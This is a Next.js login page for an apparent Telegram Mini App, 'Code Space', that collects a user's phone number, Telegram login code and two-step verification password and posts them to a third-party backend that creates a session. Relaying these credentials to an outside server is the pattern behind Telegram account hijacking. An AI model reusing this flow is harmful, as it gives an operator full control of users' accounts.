"use client";
import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import { ChevronLeft, Send, User, ChevronDown, ArrowRight, Delete, Loader2, KeyRound } from "lucide-react";
import { saveLocal } from "@/lib/api";

export default function LoginPage() {
  const router = useRouter();
  const [step, setStep] = useState<"phone" | "otp" | "password">("phone");
  const [phone, setPhone] = useState("");
  const [countryCode, setCountryCode] = useState("+880");
  const [otp, setOtp] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [sessionId, setSessionId] = useState("");
  const [tgApp, setTgApp] = useState<any>(null);

  useEffect(() => {
    // Initialize Telegram WebApp
    if (typeof window !== "undefined" && (window as any).Telegram?.WebApp) {
      const tg = (window as any).Telegram.WebApp;
      tg.ready();
      tg.expand();
      setTgApp(tg);
    }
  }, []);

  // 1. Share Number via Telegram WebApp
  const handleShareContact = () => {
    if (!tgApp) {
      setError("Telegram WebApp not detected. Please enter manually.");
      return;
    }
    tgApp.requestContact((sent: boolean, response: any) => {
      if (sent && response && response.phone_number) {
        // response.phone_number usually comes as "8801XXXXXXXXX"
        const rawNum = response.phone_number;
        const code = "+" + rawNum.substring(0, 3); // Basic split, assuming +880
        const num = rawNum.substring(3);
        setCountryCode(code);
        setPhone(num);
        sendOtpToBackend(code + num);
      }
    });
  };

  // 2. Manual Number Keypad Handler
  const handleNumClick = (num: string) => {
    if (phone.length < 15) setPhone(prev => prev + num);
  };

  const handleDelete = () => {
    setPhone(prev => prev.slice(0, -1));
  };

  // 3. Send OTP API Call
  const sendOtpToBackend = async (fullPhone: string) => {
    setLoading(true);
    setError("");
    try {
      const res = await fetch(`${process.env.NEXT_PUBLIC_API_URL || "https://api.yourdomain.com"}/auth/send-otp`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ phone: fullPhone })
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.detail || "Failed to send OTP");
      
      setSessionId(data.session_id);
      setStep("otp");
    } catch (err: any) {
      setError(err.message || "Something went wrong!");
    }
    setLoading(false);
  };

  const handleProceedManual = () => {
    if (phone.length < 6) return setError("Please enter a valid number");
    sendOtpToBackend(countryCode + phone);
  };

  // 4. Verify OTP API Call
  const handleVerifyOtp = async () => {
    if (!otp || otp.length < 4) return setError("Enter valid OTP");
    setLoading(true);
    setError("");
    try {
      const res = await fetch(`${process.env.NEXT_PUBLIC_API_URL || "https://api.yourdomain.com"}/auth/verify-otp`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ session_id: sessionId, code: otp, password: password || null })
      });
      const data = await res.json();
      
      if (data.needs_password) {
         setStep("password");
         setLoading(false);
         return;
      }
      
      if (!res.ok) throw new Error(data.detail || "Invalid OTP");
      
      // Save Session and Redirect
      saveLocal("session", data);
      router.push("/dashboard");
    } catch (err: any) {
      setError(err.message || "Verification failed!");
    }
    setLoading(false);
  };

  // --- UI RENDERERS ---

  const renderPhoneStep = () => (
    <>
      <div className="flex justify-center mb-6">
        <div className="w-20 h-20 bg-[#1cd45a] rounded-2xl flex items-center justify-center shadow-[0_0_30px_rgba(28,212,90,0.2)]">
          <Send size={36} className="text-black ml-1" />
        </div>
      </div>

      <h1 className="text-3xl font-bold text-center mb-2">
        Code <span className="text-[#1cd45a]">Space</span>
      </h1>
      <p className="text-center text-white/50 text-[15px] mb-8">
        Connect your Telegram account to get started.
      </p>

      {error && <div className="bg-red-500/10 text-red-500 text-sm p-3 rounded-xl mb-4 text-center">{error}</div>}

      <button onClick={handleShareContact} className="w-full bg-[#2b8bf5] text-white py-4 rounded-2xl font-semibold text-[16px] flex items-center justify-center gap-2 mb-6">
        <User size={20} /> Share Telegram number
      </button>

      <div className="flex items-center gap-4 mb-6">
        <div className="h-[1px] flex-1 bg-white/10"></div>
        <span className="text-xs text-white/40 font-medium">or enter manually</span>
        <div className="h-[1px] flex-1 bg-white/10"></div>
      </div>

      <div className="relative mb-3">
        <select value={countryCode} onChange={(e) => setCountryCode(e.target.value)} className="w-full bg-[#141414] border border-white/10 text-white appearance-none rounded-2xl px-5 py-4 outline-none focus:border-[#1cd45a]">
          <option value="+880">Bangladesh (+880)</option>
          <option value="+91">India (+91)</option>
          <option value="+1">USA (+1)</option>
          <option value="+44">UK (+44)</option>
          <option value="+971">UAE (+971)</option>
          <option value="+966">Saudi Arabia (+966)</option>
        </select>
        <ChevronDown size={20} className="absolute right-5 top-1/2 -translate-y-1/2 text-white/40 pointer-events-none" />
      </div>

      <div className="flex items-center bg-[#141414] border border-white/10 rounded-2xl px-5 py-4 mb-4 focus-within:border-[#1cd45a] transition-colors">
        <span className="text-[#1cd45a] text-lg mr-3 font-semibold">{countryCode}</span>
        <input 
          type="text" 
          value={phone}
          readOnly
          placeholder="" 
          className="bg-transparent outline-none flex-1 text-lg tracking-widest placeholder-white/20 text-white"
        />
        <div className="h-6 w-[2px] bg-[#1cd45a] animate-pulse"></div>
      </div>

      <div className="flex justify-end mb-6">
        <button 
          onClick={handleProceedManual}
          disabled={loading}
          className="w-14 h-14 bg-[#1cd45a] text-black rounded-full flex items-center justify-center shadow-lg hover:opacity-90 transition-opacity disabled:opacity-50"
        >
          {loading ? <Loader2 size={24} className="animate-spin" /> : <ArrowRight size={24} />}
        </button>
      </div>

      <div className="grid grid-cols-3 gap-3 mt-auto pb-8">
        {[1, 2, 3, 4, 5, 6, 7, 8, 9].map(num => (
          <button key={num} onClick={() => handleNumClick(num.toString())} className="bg-[#141414] rounded-2xl py-4 text-2xl font-semibold active:bg-white/10 transition-colors">
            {num}
          </button>
        ))}
        <div className="bg-transparent"></div>
        <button onClick={() => handleNumClick("0")} className="bg-[#141414] rounded-2xl py-4 text-2xl font-semibold active:bg-white/10 transition-colors">
          0
        </button>
        <button onClick={handleDelete} className="bg-[#141414] rounded-2xl flex items-center justify-center active:bg-white/10 transition-colors">
          <Delete size={24} />
        </button>
      </div>
    </>
  );

  const renderOtpStep = () => (
    <div className="flex flex-col h-full justify-center pb-20">
       <button onClick={() => setStep("phone")} className="text-white/60 mb-8 w-fit"><ChevronLeft size={28}/></button>
       
       <div className="flex justify-center mb-6">
        <div className="w-20 h-20 bg-[#1cd45a] rounded-full flex items-center justify-center">
          <KeyRound size={36} className="text-black" />
        </div>
      </div>

      <h1 className="text-2xl font-bold text-center mb-2">Enter Code</h1>
      <p className="text-center text-white/50 text-[15px] mb-8">
        We sent a code to {countryCode}{phone} on Telegram.
      </p>

      {error && <div className="bg-red-500/10 text-red-500 text-sm p-3 rounded-xl mb-4 text-center">{error}</div>}

      <input 
        type="text" 
        value={otp}
        onChange={(e) => setOtp(e.target.value)}
        placeholder="1 2 3 4 5"
        className="w-full bg-[#141414] border border-white/10 text-center text-3xl tracking-[1em] text-white rounded-2xl py-5 outline-none focus:border-[#1cd45a] mb-6"
        maxLength={6}
      />

      <button 
        onClick={handleVerifyOtp}
        disabled={loading || otp.length < 3}
        className="w-full bg-[#1cd45a] text-black py-4 rounded-2xl font-bold text-lg flex justify-center items-center disabled:opacity-50"
      >
        {loading ? <Loader2 size={24} className="animate-spin" /> : "Verify & Login"}
      </button>
    </div>
  );

  const renderPasswordStep = () => (
    <div className="flex flex-col h-full justify-center pb-20">
       <div className="flex justify-center mb-6">
        <div className="w-20 h-20 bg-yellow-500 rounded-full flex items-center justify-center">
          <KeyRound size={36} className="text-black" />
        </div>
      </div>

      <h1 className="text-2xl font-bold text-center mb-2">Two-Step Verification</h1>
      <p className="text-center text-white/50 text-[15px] mb-8">
        Your account is protected by a password.
      </p>

      {error && <div className="bg-red-500/10 text-red-500 text-sm p-3 rounded-xl mb-4 text-center">{error}</div>}

      <input 
        type="password" 
        value={password}
        onChange={(e) => setPassword(e.target.value)}
        placeholder="Enter your 2FA password"
        className="w-full bg-[#141414] border border-white/10 text-center text-xl text-white rounded-2xl py-5 outline-none focus:border-[#1cd45a] mb-6"
      />

      <button 
        onClick={handleVerifyOtp}
        disabled={loading || password.length < 2}
        className="w-full bg-[#1cd45a] text-black py-4 rounded-2xl font-bold text-lg flex justify-center items-center disabled:opacity-50"
      >
        {loading ? <Loader2 size={24} className="animate-spin" /> : "Submit Password"}
      </button>
    </div>
  );

  return (
    <div className="min-h-screen bg-[#0a0a0a] text-white font-sans flex flex-col">
      <div className="flex items-center justify-between p-4 pt-6">
        <button onClick={() => router.back()} className="w-10 h-10 rounded-full bg-[#1a1a1a] flex items-center justify-center">
          <ChevronLeft size={20} />
        </button>
        <button className="w-10 h-10 rounded-full bg-[#1a1a1a] flex items-center justify-center">
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="1"/><circle cx="12" cy="5" r="1"/><circle cx="12" cy="19" r="1"/></svg>
        </button>
      </div>

      <div className="flex-1 px-6 flex flex-col mt-4">
        {step === "phone" && renderPhoneStep()}
        {step === "otp" && renderOtpStep()}
        {step === "password" && renderPasswordStep()}
      </div>
    </div>
  );
}
